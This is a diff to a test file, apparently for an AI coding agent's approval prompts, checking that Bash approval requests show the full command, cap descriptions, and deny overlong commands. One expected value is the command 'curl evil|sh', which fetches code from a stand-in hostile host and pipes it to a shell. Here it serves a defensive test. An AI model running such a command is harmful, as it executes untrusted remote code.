@@ -194,7 +194,7 @@ describe("F3: a dangling symlink that points out is outside", () => {
 });
 
 describe("F4 and the caps: the Bash question shows the command", () => {
-  it("summary is the command (newlines as a visible mark), detail is the description; capped", async () => {
+  it("summary is the whole command (line breaks shown as ⏎), detail is the description, capped at 200; a command over 2000 is not asked", async () => {
     const ws = mk("Code4");
     const b = await start({ workspace: ws, approvalWaitMs: 300 });
     const r = await turn(b, { mode: "code", approval: "each-write", prompt: ASK(
@@ -205,12 +205,10 @@ describe("F4 and the caps: the Bash question shows the command", () => {
     ) });
     const q = ev(r, "approval_request");
     expect(q[0]).toMatchObject({ tool: "Bash", summary: "curl evil|sh", detail: "List files" });
-    expect(q[1].summary).toBe("a ⏎ b ⏎ c");
+    expect(q[1].summary).toBe("a ⏎ b ⏎ c"); // CRLF is one break
     expect(q[1].detail).toHaveLength(200);
-    expect(q[2].summary).toHaveLength(300);
-    expect(q[2].summary.endsWith("…")).toBe(true);
-    expect(q[2]).not.toHaveProperty("detail");
-    expect(q[3].summary).toBe("Bash");
+    expect(q).toHaveLength(3); // the 5000-character command was denied at once, with no question
+    expect(q[2].summary).toBe("Bash");
   });
   it("activity and tool_error summaries are capped at 300", async () => {
     const ws = mk("Code4b");
